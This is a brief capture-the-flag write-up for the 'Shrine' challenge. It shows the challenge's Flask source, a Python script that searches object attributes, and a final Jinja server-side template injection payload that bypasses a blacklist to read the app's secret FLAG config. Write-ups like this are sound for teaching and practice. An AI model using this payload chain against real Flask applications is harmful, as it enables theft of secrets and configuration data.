# Shrine

Learn from DoubleSigma's [writeup](https://ctftime.org/writeup/10851).

We can get source code from website.

```python
import flask
import os


app = flask.Flask(__name__)
app.config['FLAG'] = os.environ.pop('FLAG')

@app.route('/')
def index():
    return open(__file__).read()

@app.route('/shrine/<path:shrine>')
def shrine(shrine):
    def safe_jinja(s):
        s = s.replace('(', '').replace(')', '')
        blacklist = ['config', 'self']
        return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist])+s
    return flask.render_template_string(safe_jinja(shrine))

if __name__ == '__main__':
    app.run(debug=True)
``` 

It likes we should search some child attributes to get flag

```python
# search.py

def search(obj, max_depth):
    
    visited_clss = []
    visited_objs = []
    
    def visit(obj, path='obj', depth=0):
        yield path, obj
        
        if depth == max_depth:
            return

        elif isinstance(obj, (int, float, bool, str, bytes)):
            return

        elif isinstance(obj, type):
            if obj in visited_clss:
                return
            visited_clss.append(obj)
            print(obj)

        else:
            if obj in visited_objs:
                return
            visited_objs.append(obj)
        
        # attributes
        for name in dir(obj):
            if name.startswith('__') and name.endswith('__'):
                if name not in  ('__globals__', '__class__', '__self__',
                                 '__weakref__', '__objclass__', '__module__'):
                    continue
            attr = getattr(obj, name)
            yield from visit(attr, '{}.{}'.format(path, name), depth + 1)
        
        # dict values
        if hasattr(obj, 'items') and callable(obj.items):
            try:
                for k, v in obj.items():
                    yield from visit(v, '{}[{}]'.format(path, repr(k)), depth)
            except:
                pass
        
        # items
        elif isinstance(obj, (set, list, tuple, frozenset)):
            for i, v in enumerate(obj):
                yield from visit(v, '{}[{}]'.format(path, repr(i)), depth)
            
    yield from visit(obj)
```

After run this in flask, we can get

```python
request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config['FLAG']
```
